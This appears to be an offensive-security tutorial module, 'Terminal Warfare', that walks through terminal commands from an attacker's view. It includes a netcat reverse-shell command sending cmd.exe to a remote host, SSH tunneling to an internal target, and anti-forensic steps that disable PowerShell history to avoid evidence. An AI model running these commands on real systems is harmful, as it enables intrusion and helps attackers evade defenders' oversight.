Module 00 — Terminal Warfare

First Principle: The terminal is your weapon. Every command is a round.

Section 1: Where Am I?
PS C:\Users\gwu07> pwd
Path
----
C:\Users\gwu07
pwd = print working directory. Know where you are before you move.
Section 2: What's Here?
PS C:\Users\gwu07> ls

Section 7: netcat — Swiss Army Knife
PS C:\Users\gwu07> nc -lvnp 4444
listening on [any] 4444 ...
PS C:\Users\gwu07> nc 192.168.1.92 4444 -e cmd.exe
Microsoft Windows [Version 10.0.26200.8655]
(c) Microsoft Corporation. All rights reserved.

C:\Users\gwu07>
Bind shell: target listens, you connect. Reverse shell: target connects to you. netcat is the attacker's Swiss Army knife.
Section 8: ssh Tunneling
PS C:\Users\gwu07> ssh -L 8080:internal.target.com:80 user@jumpbox
user@jumpbox's password:
Last login: Mon Jun 28 21:30:00 2026 from 192.168.1.92
[user@jumpbox ~]$
# Now browse localhost:8080 to reach internal.target.com:80
Local port forward: your port → target's port through jumpbox. SSH is a tunnel, not just a shell.
Section 9: History Poisoning
PS C:\Users\gwu07> Set-PSReadlineOption -HistorySaveStyle SaveNothing
PS C:\Users\gwu07> Clear-History
# History disabled. No evidence written to disk.
Every command is evidence. Disable history or leave lies. The defender reads .bash_history and PowerShell transcripts.
